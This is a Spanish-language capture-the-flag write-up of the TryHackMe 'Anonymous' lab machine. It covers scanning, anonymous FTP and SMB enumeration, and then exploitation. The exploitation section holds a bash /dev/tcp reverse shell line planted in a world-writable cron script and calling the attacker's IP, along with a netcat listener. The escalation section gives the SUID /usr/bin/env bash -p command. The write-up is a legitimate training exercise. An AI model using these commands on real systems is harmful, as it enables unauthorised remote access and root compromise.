# Anonymous — TryHackMe

## Información de la máquina

| Característica | Descripción |
|---|---|
| Plataforma | TryHackMe |
| Máquina | Anonymous |
| Sistema operativo | Linux |
| IP objetivo | 10.65.183.47 |
| Máquina atacante | Kali Linux |
| Herramientas | Nmap |
| Objetivo | Obtener las flags user.txt y root.txt |

**Enlace:** https://tryhackme.com/room/anonymous

> Este writeup documenta las técnicas de reconocimiento, enumeración, explotación y escalada de privilegios utilizadas durante la resolución de Anonymous, una máquina vulnerable disponible en TryHackMe. Todas las pruebas se realizan dentro de un entorno de laboratorio autorizado.

---

## 1. Reconocimiento

### Objetivo

Identificar los puertos abiertos, servicios activos y versiones de software presentes en la máquina objetivo para determinar posibles vectores de ataque.

### Herramientas utilizadas

- Kali Linux
- Nmap
- Escaneo TCP SYN
- Scripts NSE de Nmap

### Procedimiento

**1. Escaneo de puertos y servicios**

Desde la terminal de Kali Linux, se ejecutó el siguiente comando:

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.65.183.47 -oN escaneo
```
Explicación de los parámetros:

- `-p-`: escanea todos los puertos TCP, desde el 1 hasta el 65535.
- `--open`: muestra los puertos identificados como abiertos.
- `-sS`: realiza un escaneo TCP SYN.
- `-sC`: ejecuta los scripts predeterminados de Nmap.
- `-sV`: identifica los servicios y sus versiones.
- `--min-rate 5000`: solicita una tasa mínima de 5000 paquetes por segundo.
- `-n`: evita la resolución de nombres DNS.
- `-vvv`: muestra información detallada durante el escaneo.
- `-Pn`: omite el descubrimiento previo del host.
- `-oN escaneo`: guarda los resultados en un archivo de texto llamado `escaneo`.

Este escaneo permitió identificar los servicios accesibles en la máquina y obtener información sobre sus versiones.

**Evidencia 1: Ejecución del escaneo Nmap**

<img width="716" height="644" alt="image" src="https://github.com/user-attachments/assets/eade04ea-3bcd-4e7b-acd4-4cbf3c6d5df3" />

### Resultados del escaneo

Se identificaron cuatro puertos TCP abiertos:

| Puerto | Servicio | Versión identificada |
|---|---|---|
| 21/tcp | FTP | vsftpd 2.0.8 o posterior |
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 139/tcp | NetBIOS-SSN | Samba |
| 445/tcp | SMB | Samba 4.7.6-Ubuntu |

Los resultados permitieron identificar servicios de transferencia de archivos, acceso remoto y compartición de recursos.

**Evidencia 2: Identificación de puertos y servicios**

<img width="734" height="572" alt="image" src="https://github.com/user-attachments/assets/8e6982be-7919-4d6d-8132-91dd06c1ba56" />

### Análisis de los servicios

**Puerto 21 — FTP**

El servicio FTP permite transferir archivos entre equipos mediante una conexión de red.

Durante el escaneo, el script `ftp-anon` detectó que el servidor permite autenticación anónima:

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Además, se identificó un directorio llamado `scripts` con permisos de escritura:

```text
drwxrwxrwx  scripts [NSE: writeable]
```

Este hallazgo resulta relevante porque el acceso anónimo combinado con permisos de escritura podría representar un riesgo de seguridad.

Sin embargo, es necesario analizar el contenido del directorio y comprobar cómo se utilizan sus archivos antes de determinar si existe una vulnerabilidad explotable.

**Puerto 22 — SSH**

Se identificó el servicio OpenSSH 7.6p1, utilizado para administrar sistemas de forma remota mediante conexiones cifradas.

En esta fase no se identificaron credenciales válidas para acceder mediante SSH.

**Puertos 139 y 445 — SMB**

Se detectó el servicio Samba, utilizado para compartir archivos y recursos a través de la red.

Estos puertos representan otro punto de interés para la enumeración, ya que podrían existir recursos compartidos accesibles o configuraciones inseguras.

### Resultado

El escaneo permitió identificar cuatro puertos TCP abiertos y sus servicios asociados.

El hallazgo más relevante fue la posibilidad de autenticación anónima en FTP y la existencia de un directorio llamado `scripts` con permisos de escritura.

Esta información proporciona un punto de partida para continuar con la enumeración de servicios.

### Conocimientos adquiridos

- Reconocimiento de puertos mediante Nmap.
- Identificación de servicios y versiones de software.
- Uso de scripts NSE para obtener información adicional.
- Interpretación de resultados de escaneo TCP.
- Identificación de servicios potencialmente inseguros.
- Análisis inicial de superficies de ataque.
- Importancia de validar los hallazgos antes de intentar explotarlos.

---

## 2. Enumeración del servicio FTP

### Objetivo

Analizar el servicio FTP identificado durante la fase de reconocimiento para determinar si permite conexiones anónimas, identificar recursos accesibles y detectar posibles configuraciones inseguras que puedan representar un vector de ataque.

### Herramientas utilizadas

- Kali Linux
- Cliente FTP
- Comandos: ftp, ls, cd, get, cat, tail
- Análisis de permisos de archivos Linux

### Procedimiento

**1. Conexión al servicio FTP**

Durante el reconocimiento con Nmap se identificó el puerto 21/TCP abierto, correspondiente al servicio FTP.

Se estableció una conexión con el servidor mediante el siguiente comando:

```bash
ftp 10.65.183.47
```

Cuando el servidor solicitó las credenciales, se utilizó el usuario `anonymous` sin introducir una contraseña.

El servidor respondió:

```text
230 Login successful.
```

Esta respuesta confirmó que el servidor FTP permitía conexiones anónimas, es decir, el acceso a determinados recursos sin necesidad de proporcionar credenciales personales.

**Evidencia 3: Conexión anónima al servicio FTP**

<img width="322" height="136" alt="image" src="https://github.com/user-attachments/assets/54639c61-a062-46c6-b52b-7e9d8b16ee25" />

**2. Enumeración de directorios**

Después de establecer la conexión, se ejecutó el siguiente comando dentro del cliente FTP:

```text
ls -la
```

Se identificó un directorio llamado `scripts` con los siguientes permisos:

```text
drwxrwxrwx  scripts
```

Los permisos `rwxrwxrwx` indican que el directorio permite lectura, escritura y ejecución para el propietario, el grupo y otros usuarios.

Esta configuración representa un posible riesgo de seguridad porque permite operaciones de escritura más amplias de lo necesario.

**Evidencia 4: Enumeración de directorios FTP**

<img width="522" height="145" alt="image" src="https://github.com/user-attachments/assets/b5bee31b-f014-4bb4-bef7-66582cc1004a" />

**3. Exploración del directorio scripts**

Se accedió al directorio encontrado mediante:

```text
cd scripts
```

Posteriormente, se enumeraron sus archivos:

```text
ls -la
```

Se identificaron tres archivos:

| Archivo | Permisos | Tamaño |
|---|---|---|
| clean.sh | -rwxr-xrwx | 314 bytes |
| removed_files.log | -rw-rw-r-- | 1720 bytes |
| to_do.txt | -rw-r--r-- | 68 bytes |

El archivo `clean.sh` llamó especialmente la atención debido a que posee permisos de escritura para todos los usuarios.

La presencia de un script ejecutable con estos permisos dentro de un directorio accesible mediante FTP anónimo representa un posible vector de ataque.

**Evidencia 5: Archivos encontrados en scripts**

<img width="620" height="204" alt="image" src="https://github.com/user-attachments/assets/732ec4d7-7e23-461b-b152-a8ac6065e919" />

**4. Descarga de archivos para su análisis**

Con el objetivo de examinar el contenido de los archivos sin modificarlos en el servidor, se descargaron mediante el cliente FTP.

```text
get clean.sh
get removed_files.log
get to_do.txt
```

El comando `get` permite descargar archivos desde un servidor FTP hacia el equipo local.

Una vez finalizada la descarga, se analizaron los archivos desde la terminal de Kali Linux.

**5. Análisis del script clean.sh**

Se ejecutó:

```bash
cat clean.sh
```

Se identificó un script de Bash encargado de comprobar archivos temporales y registrar las operaciones de limpieza realizadas.

Entre los elementos utilizados por el script se encontraron:

- `#!/bin/bash`: indica que el script debe interpretarse mediante Bash.
- `echo`: permite mostrar mensajes y escribir información en archivos.
- `if`: evalúa condiciones.
- `for`: permite recorrer una lista de elementos.
- `rm -rf`: elimina archivos o directorios de manera recursiva y forzada.
- `date`: obtiene la fecha y hora del sistema.

El script utiliza el archivo `removed_files.log` para registrar sus operaciones.

Además, el archivo `clean.sh` presenta los siguientes permisos:

```text
-rwxr-xrwx
```

Estos permisos permiten que otros usuarios modifiquen su contenido.

Si el sistema ejecuta automáticamente este archivo, una modificación no autorizada podría representar un riesgo de ejecución de comandos.

**Evidencia 6: Análisis del script clean.sh**

<img width="921" height="219" alt="image" src="https://github.com/user-attachments/assets/1832c00f-5e7b-4d0c-aa5b-1c6112038585" />

**6. Análisis del archivo removed_files.log**

Para examinar los registros más recientes del script, se ejecutó:

```bash
tail -n 20 removed_files.log
```

El comando `tail` permite mostrar las últimas líneas de un archivo, mientras que `-n 20` indica que se deben visualizar las últimas veinte líneas.

Se identificó el siguiente mensaje repetido:

```text
Running cleanup script: nothing to delete
```

Esto indica que el script ha registrado múltiples operaciones de limpieza.

La repetición de estos mensajes sugiere que el archivo podría ejecutarse periódicamente mediante una tarea automatizada.

Sin embargo, todavía es necesario confirmar el mecanismo responsable de su ejecución.

**Evidencia 7: Análisis de los registros de limpieza**

<img width="362" height="363" alt="image" src="https://github.com/user-attachments/assets/8ce46dce-9db1-4e1f-91f6-d4af2f4b80b6" />

**7. Análisis del archivo to_do.txt**

Se ejecutó:

```bash
cat to_do.txt
```

El archivo contenía el siguiente mensaje:

```text
I really need to disable the anonymous login...it's really not safe
```

Este mensaje señala que el acceso anónimo al servicio FTP es una configuración insegura que debería deshabilitarse.

El contenido resulta relevante porque confirma que la exposición del servicio FTP es una preocupación conocida dentro del entorno.

**Evidencia 8: Contenido del archivo to_do.txt**

<img width="562" height="69" alt="image" src="https://github.com/user-attachments/assets/97ba302e-c9a9-48b6-be2c-1e1c941cee90" />

### Hallazgos de seguridad

A partir de la enumeración y del análisis de los archivos se identificaron los siguientes hallazgos:

**1. Acceso FTP anónimo habilitado**

El servidor permite establecer conexiones sin credenciales personales mediante el usuario `anonymous`.

Esta configuración podría exponer información o permitir operaciones no autorizadas, dependiendo de los permisos asignados.

**2. Directorio con permisos de escritura**

El directorio `scripts` presenta permisos `rwxrwxrwx`, lo que permite operaciones de escritura a otros usuarios del sistema.

Esto representa una configuración potencialmente insegura.

**3. Script modificable por otros usuarios**

El archivo `clean.sh` presenta permisos `-rwxr-xrwx`, permitiendo su modificación por usuarios distintos del propietario.

Si este archivo es ejecutado por un proceso automatizado, podría existir una vulnerabilidad de ejecución de comandos.

**4. Posible ejecución periódica del script**

El archivo `removed_files.log` contiene múltiples registros de ejecución del script de limpieza.

Esto sugiere la existencia de una tarea automatizada, aunque todavía debe confirmarse su funcionamiento.

### Resultado

Se confirmó que el servicio FTP permite conexiones anónimas y proporciona acceso al directorio `scripts`.

Dentro del directorio se identificaron tres archivos: `clean.sh`, `removed_files.log` y `to_do.txt`.

El análisis permitió detectar permisos de escritura excesivos en el directorio y en el script `clean.sh`, así como registros que sugieren su ejecución periódica.

Estos hallazgos representan un posible vector de ataque que deberá investigarse durante la fase de explotación.

### Conocimientos adquiridos

- Enumeración de servicios FTP.
- Identificación de autenticación anónima.
- Navegación por directorios remotos.
- Descarga de archivos mediante el comando get.
- Interpretación de permisos de archivos en Linux.
- Análisis básico de scripts Bash.
- Identificación de configuraciones inseguras.
- Análisis de archivos de registro mediante tail.
- Reconocimiento de posibles tareas automatizadas.
- Identificación de posibles vectores de ejecución de comandos.

---

## 3. Enumeración del servicio SMB

### Objetivo

Analizar los servicios SMB identificados durante el reconocimiento, correspondientes a los puertos 139 y 445, para descubrir recursos compartidos, identificar sus permisos y determinar si es posible acceder a información sin proporcionar credenciales.

### Herramientas utilizadas

- Kali Linux
- SMBClient
- SMBMap
- Comandos: smbclient, smbmap, ls

### Procedimiento

**1. Identificación de recursos compartidos**

Durante el reconocimiento inicial con Nmap se identificaron los puertos 139 y 445 abiertos, correspondientes al servicio Samba.

Se utilizó la herramienta smbclient para enumerar los recursos compartidos disponibles:

```bash
smbclient -L //10.65.183.47 -N
```

Explicación del comando:

- `smbclient`: permite interactuar con recursos compartidos mediante el protocolo SMB.
- `-L`: enumera los recursos compartidos del servidor.
- `//10.65.183.47`: indica la dirección IP del objetivo.
- `-N`: intenta establecer la conexión sin solicitar una contraseña.

El resultado mostró tres recursos compartidos:

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
pics            Disk      My SMB Share Directory for Pics
IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
```

También se identificó el grupo de trabajo `WORKGROUP` y el nombre `ANONYMOUS` durante la enumeración.

**Evidencia 9: Identificación de recursos compartidos**

<img width="676" height="265" alt="image" src="https://github.com/user-attachments/assets/fe820ac9-aff1-445d-a5ee-fd9d296ede79" />

**2. Análisis de permisos SMB**

Para identificar los permisos disponibles sobre cada recurso compartido, se utilizó SMBMap:

```bash
smbmap -H 10.65.183.47
```

La herramienta identificó una sesión SMB sin autenticación y mostró los siguientes permisos:

| Recurso compartido | Permisos | Descripción |
|---|---|---|
| print$ | NO ACCESS | Controladores de impresora |
| pics | READ ONLY | Directorio de imágenes compartidas |
| IPC$ | NO ACCESS | Servicio IPC de Samba |

Se identificó que el recurso `pics` permitía acceso de solo lectura sin proporcionar credenciales.

Esto significa que un usuario no autenticado podía consultar los archivos disponibles dentro de dicho recurso.

**Evidencia 10: Análisis de permisos mediante SMBMap**

<img width="1059" height="396" alt="image" src="https://github.com/user-attachments/assets/5a98c305-7a06-47ab-8b5d-69cda2d503b4" />

**3. Acceso al recurso compartido pics**

Después de identificar el recurso accesible, se estableció una conexión mediante SMBClient:

```bash
smbclient //10.65.183.47/pics -N
```

La conexión se realizó correctamente y se obtuvo acceso al recurso compartido.

Posteriormente, se ejecutó:

```text
ls
```

El comando permitió enumerar los archivos disponibles dentro del directorio compartido.

Se identificaron dos imágenes:

```text
corgo2.jpg
puppos.jpeg
```

Los archivos estaban disponibles para su lectura a través del servicio SMB.

**Evidencia 11: Enumeración de archivos del recurso pics**

<img width="673" height="188" alt="image" src="https://github.com/user-attachments/assets/bab71d4b-c07c-41c3-ab59-81bbc8613fe7" />

### Análisis de los hallazgos

**1. Recursos compartidos accesibles sin autenticación**

Se identificó que el servidor permite enumerar sus recursos compartidos mediante una sesión SMB sin credenciales.

Esto puede proporcionar información sobre la estructura y los servicios disponibles en el sistema.

**2. Acceso de solo lectura al recurso pics**

El directorio compartido `pics` permite consultar archivos sin autenticación.

Aunque no se identificaron permisos de escritura, la posibilidad de acceder a archivos sin credenciales podría representar un riesgo de exposición de información dependiendo de su contenido.

**3. Identificación de archivos compartidos**

Se encontraron los archivos `corgo2.jpg` y `puppos.jpeg`.

Durante esta fase se confirmó su existencia, pero todavía no se analizó su contenido ni se determinó si contienen información relevante para la explotación.

### Resultado

Se identificaron tres recursos compartidos mediante el servicio SMB: `print$`, `pics` e `IPC$`.

El análisis de permisos permitió determinar que únicamente `pics` era accesible en modo de solo lectura mediante una sesión sin autenticación.

Posteriormente, se estableció una conexión con dicho recurso y se identificaron dos archivos de imagen.

La enumeración permitió ampliar el conocimiento de la superficie de ataque y detectar una posible exposición de información a través del servicio SMB.

### Conocimientos adquiridos

- Enumeración de recursos compartidos mediante SMBClient.
- Análisis de permisos SMB utilizando SMBMap.
- Identificación de sesiones SMB sin autenticación.
- Acceso a recursos compartidos de red.
- Interpretación de permisos READ ONLY y NO ACCESS.
- Enumeración de archivos dentro de recursos SMB.
- Identificación de posibles riesgos de exposición de información.
- Importancia de validar los permisos de acceso a recursos compartidos.

### Evidencias

- Enumeración de recursos compartidos mediante SMBClient.
- Identificación de permisos utilizando SMBMap.
- Acceso al recurso pics y enumeración de sus archivos.

---

## 4. Explotación

### Objetivo

Obtener acceso inicial a la máquina objetivo aprovechando la configuración insegura del servicio FTP y los permisos de escritura del script `clean.sh`.

### Herramientas utilizadas

- Kali Linux
- FTP
- Netcat
- Bash
- Comandos: ip, nc, ftp, put, whoami, id, hostname

### Procedimiento

**1. Identificación del vector de ataque**

Durante la enumeración FTP se identificó un directorio llamado `scripts`, accesible mediante autenticación anónima.

Dentro del directorio se encontró el archivo `clean.sh`, el cual presentaba permisos de escritura para todos los usuarios:

```text
-rwxr-xrwx
```

El análisis del archivo `removed_files.log` también mostró registros repetidos de ejecución del script de limpieza.

Estos hallazgos permitieron identificar un posible vector de ejecución de comandos mediante la modificación de un script ejecutado automáticamente por el sistema.

**2. Identificación de la dirección IP de Kali Linux**

Para establecer una conexión inversa desde la máquina objetivo, se identificó la dirección IP de la interfaz VPN de Kali Linux.

```bash
ip -4 addr show tun0
```

La interfaz `tun0` tenía asignada la siguiente dirección IP:

```text
192.168.193.58
```

Esta dirección se utilizó como destino de la conexión inversa.

**3. Preparación del listener con Netcat**

Desde una terminal de Kali Linux, se ejecutó:

```bash
nc -lvnp 4444
```

Explicación del comando:

- `nc`: ejecuta la herramienta Netcat.
- `-l`: habilita el modo escucha.
- `-v`: muestra información detallada sobre la conexión.
- `-n`: evita la resolución de nombres DNS.
- `-p 4444`: especifica el puerto de escucha.

El listener quedó esperando una conexión entrante desde la máquina objetivo.

**4. Modificación del script clean.sh**

Se preparó una copia modificada de `clean.sh` que incluía una instrucción para establecer una reverse shell.

```bash
bash -c "bash -i >& /dev/tcp/192.168.193.58/4444 0>&1"
```

Esta instrucción permite iniciar una sesión interactiva de Bash y redirigir su entrada y salida a una conexión TCP hacia Kali Linux.

Explicación:

- `bash -c`: ejecuta una instrucción mediante Bash.
- `bash -i`: inicia una shell interactiva.
- `/dev/tcp/192.168.193.58/4444`: establece una conexión TCP hacia el equipo atacante.
- `>&`: redirige la salida estándar y la salida de errores.
- `0>&1`: redirige la entrada estándar hacia la conexión.

**Evidencia 12: Preparación de la reverse shell**

<img width="940" height="256" alt="image" src="https://github.com/user-attachments/assets/c6f6e395-ffa5-48a2-802f-b650cddb4cf0" />

**5. Transferencia del script mediante FTP**

Se estableció nuevamente una conexión con el servidor FTP:

```bash
ftp 10.65.183.47
```

Después de autenticarse como `anonymous`, se accedió al directorio:

```text
cd scripts
```

Posteriormente, se subió el archivo modificado:

```text
put clean.sh
```

El servidor confirmó que la transferencia se completó correctamente:

```text
226 Transfer complete.
```

La modificación permitió que la instrucción añadida se ejecutara durante la siguiente ejecución automática del script.

**Evidencia 13: Transferencia del script modificado**

<img width="403" height="359" alt="image" src="https://github.com/user-attachments/assets/882c1ccd-9e6e-48e6-b83d-d3f3b25d0356" />

**6. Obtención de la reverse shell**

Después de subir el script, el listener de Netcat recibió una conexión desde la máquina objetivo.

Se obtuvo una sesión interactiva de comandos.

Para identificar el usuario comprometido, se ejecutó:

```bash
whoami
```

Resultado:

```text
namelessone
```

Posteriormente, se verificó la identidad y los grupos del usuario:

```bash
id
```

El resultado mostró que la sesión pertenecía al usuario `namelessone`, con UID 1000.

También se ejecutó:

```bash
hostname
```

El sistema respondió:

```text
anonymous
```

Esto confirmó que se había obtenido acceso inicial a la máquina objetivo.

**Evidencia 14: Acceso inicial mediante reverse shell**

<img width="1003" height="637" alt="image" src="https://github.com/user-attachments/assets/6167a608-163e-4504-aa5e-937464a9a312" />

**7. Obtención de la flag de usuario**

Una vez dentro de la máquina, se identificó el directorio personal del usuario comprometido:

```bash
pwd
```

Resultado:

```text
/home/namelessone
```

Se enumeraron los archivos disponibles:

```bash
ls -la
```

Se identificó el archivo `user.txt` dentro del directorio personal.

Posteriormente, se ejecutó:

```bash
cat /home/namelessone/user.txt
```

Se obtuvo correctamente la flag correspondiente al usuario.

El valor de la flag se omite del writeup.

**Evidencia 15: Obtención de user.txt**

<img width="680" height="423" alt="image" src="https://github.com/user-attachments/assets/2d4e74a5-c4eb-4290-b2b8-41968253d8ee" />

### Resultado

Se consiguió acceso inicial a la máquina Anonymous mediante la modificación de un script Bash accesible a través de FTP anónimo.

La ejecución automática del archivo modificado permitió establecer una reverse shell hacia Kali Linux.

Se obtuvo acceso con el usuario `namelessone` y se localizó la flag `user.txt`.

### Conocimientos adquiridos

- Identificación de permisos inseguros en scripts.
- Análisis de posibles vectores de ejecución de comandos.
- Funcionamiento de las reverse shells.
- Uso de Netcat para recibir conexiones.
- Redirección de entrada y salida en Bash.
- Aprovechamiento de configuraciones inseguras en FTP.
- Enumeración posterior a la explotación.
- Identificación de usuarios y privilegios en Linux.

---

## 5. Escalada de privilegios

### Objetivo

Identificar configuraciones inseguras en la máquina comprometida que permitan elevar los privilegios del usuario `namelessone` hasta obtener acceso con privilegios de root.

### Herramientas utilizadas

- Kali Linux
- Bash
- Comandos: find, ls, env, whoami, id, cat
- Enumeración de archivos con permisos SUID

### Procedimiento

**1. Identificación de los privilegios iniciales**

Después de obtener acceso mediante la reverse shell, se identificó el usuario de la sesión:

```bash
whoami
```

Resultado:

```text
namelessone
```

La sesión inicial no disponía de privilegios efectivos de root.

Se procedió a investigar posibles configuraciones inseguras del sistema.

**2. Enumeración de archivos con permisos SUID**

Se realizó una búsqueda de archivos con el bit SUID activado:

```bash
find / -perm -4000 2>/dev/null
```

Explicación del comando:

- `find /`: busca archivos desde la raíz del sistema.
- `-perm -4000`: identifica archivos con el bit SUID activado.
- `2>/dev/null`: descarta mensajes de error relacionados con permisos de acceso.

El bit SUID permite que un programa se ejecute con los privilegios efectivos del propietario del archivo.

Durante la enumeración se identificaron diversos ejecutables, entre ellos:

```text
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/env
```

El ejecutable `/usr/bin/env` resultó especialmente interesante porque normalmente no necesita tener habilitado el bit SUID.

**Evidencia 16: Enumeración de archivos SUID**

<img width="494" height="865" alt="image" src="https://github.com/user-attachments/assets/f39fa3e9-11c2-42c5-b5db-662256f8f87c" />

**3. Análisis de los permisos de /usr/bin/env**

Se verificaron los permisos del ejecutable:

```bash
ls -l /usr/bin/env
```

Resultado:

```text
-rwsr-xr-x 1 root root ... /usr/bin/env
```

La letra `s` en los permisos del propietario indica que el bit SUID está activado.

Además, el archivo pertenece al usuario root.

Esto significa que el programa puede ejecutarse con los privilegios efectivos de root.

La presencia del bit SUID en este ejecutable representa una configuración insegura que podría permitir una escalada de privilegios.

**4. Explotación del permiso SUID**

Se utilizó el siguiente comando:

```bash
/usr/bin/env /bin/bash -p
```

Explicación:

- `/usr/bin/env`: ejecuta el programa indicado.
- `/bin/bash`: inicia una shell de Bash.
- `-p`: permite conservar los privilegios efectivos durante la ejecución de Bash.

Debido a que `env` tenía el bit SUID activado y pertenecía a root, se consiguió iniciar una shell con privilegios efectivos elevados.

**5. Verificación de privilegios**

Para verificar la escalada, se ejecutó:

```bash
whoami
```

Resultado:

```text
root
```

Posteriormente, se ejecutó:

```bash
id
```

El resultado confirmó que el usuario mantenía su UID real original, pero tenía UID efectivo de root:

```text
uid=1000(namelessone) gid=1000(namelessone) euid=0(root)
```

Esto confirmó que se había obtenido una shell con privilegios efectivos de administrador.

**6. Obtención de la flag root**

Una vez obtenidos los privilegios necesarios, se accedió al directorio personal de root:

```bash
cd /root
```

Se enumeraron los archivos:

```bash
ls -la
```

Se identificó el archivo `root.txt`.

Finalmente, se ejecutó:

```bash
cat /root/root.txt
```

Se obtuvo correctamente la flag correspondiente a root.

El valor de la flag se omite del writeup.

**Evidencia 17: Escalada de privilegios y acceso a root**

<img width="1100" height="437" alt="image" src="https://github.com/user-attachments/assets/10326f9c-bd93-45c7-b8f8-5700971fa280" />

### Resultado

Se identificó una configuración insegura en el ejecutable `/usr/bin/env`, el cual tenía habilitado el bit SUID y pertenecía al usuario root.

Aprovechando esta configuración, se ejecutó Bash con el parámetro `-p`, obteniendo una shell con UID efectivo 0.

Posteriormente, se accedió al directorio `/root` y se obtuvo la flag `root.txt`.

La escalada de privilegios se completó correctamente.

### Conocimientos adquiridos

- Enumeración de archivos con permisos SUID.
- Interpretación de permisos especiales en Linux.
- Identificación de ejecutables potencialmente peligrosos.
- Diferencia entre UID real y UID efectivo.
- Aprovechamiento de configuraciones inseguras.
- Uso de Bash para conservar privilegios efectivos.
- Escalada de privilegios en sistemas Linux.
- Acceso a archivos protegidos mediante privilegios administrativos.

---

## 6. Conclusiones y recomendaciones

### Conclusiones

Durante la resolución de la máquina Anonymous de TryHackMe se aplicaron técnicas de reconocimiento, enumeración, explotación y escalada de privilegios en un entorno Linux.

Inicialmente, mediante Nmap, se identificaron cuatro puertos TCP abiertos correspondientes a servicios FTP, SSH y SMB.

La enumeración del servicio FTP permitió descubrir que el servidor aceptaba conexiones anónimas y proporcionaba acceso a un directorio que contenía un script de Bash con permisos de escritura excesivos.

El aprovechamiento de esta configuración permitió modificar el script `clean.sh` y establecer una reverse shell hacia Kali Linux, obteniendo acceso inicial con el usuario `namelessone`.

Posteriormente, durante la enumeración local, se identificó que el ejecutable `/usr/bin/env` tenía habilitado el bit SUID y pertenecía al usuario root.

Esta configuración permitió ejecutar una shell con privilegios efectivos de administrador y acceder al archivo `root.txt`.

De esta manera, se completaron los objetivos principales de la máquina y se obtuvieron las flags `user.txt` y `root.txt`.

### Vulnerabilidades y configuraciones inseguras identificadas

| Hallazgo | Riesgo identificado |
|---|---|
| FTP anónimo habilitado | Acceso a recursos sin autenticación |
| Permisos de escritura excesivos | Modificación no autorizada de archivos |
| Ejecución automática de un script modificable | Posible ejecución de comandos |
| Recurso SMB accesible sin credenciales | Posible exposición de información |
| Bit SUID en /usr/bin/env | Escalada de privilegios a root |

### Recomendaciones de seguridad

**1. Deshabilitar el acceso FTP anónimo**

Se recomienda deshabilitar la autenticación anónima cuando no sea necesaria y utilizar mecanismos de autenticación adecuados.

También es recomendable sustituir FTP por protocolos que protejan la información durante la transferencia, como SFTP, cuando sea posible.

**2. Aplicar el principio de mínimo privilegio**

Los archivos y directorios deben disponer únicamente de los permisos necesarios para su funcionamiento.

Se deben evitar permisos de escritura globales, especialmente en scripts ejecutables.

**3. Proteger los scripts automatizados**

Los scripts ejecutados mediante tareas programadas deben estar protegidos contra modificaciones realizadas por usuarios no autorizados.

También se recomienda revisar periódicamente su propietario, sus permisos y el contexto de ejecución.

**4. Revisar los permisos SUID**

Se deben auditar los ejecutables que tengan habilitado el bit SUID.

En particular, herramientas como `/usr/bin/env` no deberían conservar este permiso salvo que exista una justificación técnica debidamente evaluada.

**5. Restringir el acceso a recursos SMB**

Se recomienda revisar los permisos de los recursos compartidos y evitar que usuarios no autenticados accedan a información que no esté destinada a ser pública.

**6. Realizar auditorías periódicas**

La revisión de servicios expuestos, permisos de archivos, tareas automatizadas y configuraciones del sistema permite identificar vulnerabilidades antes de que sean aprovechadas.

### Conocimientos adquiridos

La resolución de Anonymous permitió reforzar conocimientos prácticos relacionados con:

- Reconocimiento de redes mediante Nmap.
- Enumeración de servicios FTP y SMB.
- Identificación de configuraciones inseguras.
- Análisis de scripts Bash.
- Ejecución de comandos mediante scripts modificables.
- Obtención de reverse shells con Netcat.
- Enumeración local de sistemas Linux.
- Identificación y explotación de permisos SUID.
- Escalada de privilegios.
- Documentación técnica de pruebas de penetración.

### Resultado final

**Máquina:** Anonymous

**Plataforma:** TryHackMe

**Sistema operativo:** Linux

**Acceso inicial:** Usuario namelessone

**Escalada de privilegios:** SUID en /usr/bin/env

**Flags obtenidas:**
- user.txt
- root.txt

**Estado:** Completado

---

### Referencias

- [TryHackMe — Anonymous](https://tryhackme.com/room/anonymous)
- [Nmap — Documentación oficial](https://nmap.org/book/man.html)
- [GTFOBins](https://gtfobins.github.io/)
